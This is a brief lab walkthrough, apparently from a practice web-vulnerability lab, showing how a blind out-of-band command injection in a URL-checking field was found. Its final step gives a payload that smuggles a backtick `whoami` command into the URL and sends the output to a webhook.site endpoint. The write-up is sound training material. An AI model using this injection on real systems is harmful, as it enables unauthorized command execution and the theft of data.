# Command Injection - Blind | Out of Bond

- In the provided tab where I can enter the URL, I will now proceed to further investigate and explore.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/e8ba5d60-4dd4-4685-be8c-9e929e624408)

- Upon entering the website URL, the response received is "website ok."

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/5b166f42-ab4f-4b96-8266-5d7b176d38d6)

- After attempting a simple payload, the response received remains the same, indicating "website ok" without any discernible changes.
- When trying to navigate to a random page in the URL, the response received is "website not found."

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/ad7b494e-019e-4ce0-8db3-2837d813bf2d)
![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7aa181f0-64ca-47e0-a4eb-01343305537c)

- When attempting to execute a simple injection command and encountering a potential command filtering mechanism, it further reinforces the indication of a blind command injection vulnerability.
- By utilizing the webhook.site URL and injecting a command, I received a response from the URL containing the username. This confirms the existence of an `Out-of-band` command injection vulnerability.
- cmd: "<IP>?`whoami`"

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/f2afd58e-fb62-4261-8b81-8537f70dec24)
![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6df42ea6-f0f8-46b1-80b6-6713be6cc2f5)
